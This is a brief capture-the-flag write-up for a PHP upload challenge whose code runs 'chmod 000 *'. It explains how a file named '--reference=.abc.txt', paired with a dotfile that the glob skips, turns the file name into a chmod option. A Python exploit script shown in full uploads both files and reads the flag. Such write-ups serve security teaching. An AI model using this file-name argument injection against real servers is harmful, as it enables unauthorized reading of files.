https://ctftime.org/event/2467/

# submission (Web)
php app

## Solution
The bug is on
```php
$shell = shell_exec('chmod 000 *');
```
If we create a file with a name like `--help` chmod will interpret as a flag instead of a file.
So we use `--reference=somefile` that replaces the 000 mode with the perms from `somefile`.

The second interesting part is how we get a file that has read perms. We can't create files with `/` so no path traversal. The solution is to create a dotfile, glob won't select those. So the perms remain the same.

```python
#!/usr/bin/env python3
import requests

REMOTE = "http://0.0.0.0:8080/"

res = requests.post(REMOTE, files={"file": (".abc.txt", "ble")})
res = requests.post(REMOTE, files={"file": ("--reference=.abc.txt", "ble")})
res = requests.get(REMOTE + "/uploads/flag.txt")
print(res.text)
```

## Flag
`x3c{4lw4y5_chm0d_y0ur3_f1l35_4_53cur17y}`

shafouz 2025/01/26
